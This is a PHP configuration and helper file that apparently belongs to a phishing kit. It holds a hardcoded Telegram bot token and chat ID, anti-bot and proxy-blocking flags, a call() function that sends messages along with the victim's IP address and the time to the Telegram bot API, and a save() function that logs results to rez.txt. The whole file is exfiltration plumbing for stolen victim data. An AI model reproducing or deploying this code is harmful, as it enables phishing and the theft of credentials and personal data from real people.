<?php

require_once __DIR__.'/test_config.php';

$zbayb = "8380088918:AAFu6MotIQtnUncK23rCKtHv8OMrU0N-PAQ";
$id = "-5098559291";

$antibot = "yes";

$block_proxy = "yes";

$ipp = getRealClientIP();
$panel_link = str_replace("clients/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");

function call($msg){
    global $zbayb;
    global $panel_link;
    global $id;
    $real_ip = getRealClientIP();
    $info = "

/- MORE INFO -/
IP: ".$real_ip."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$zbayb.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}

?>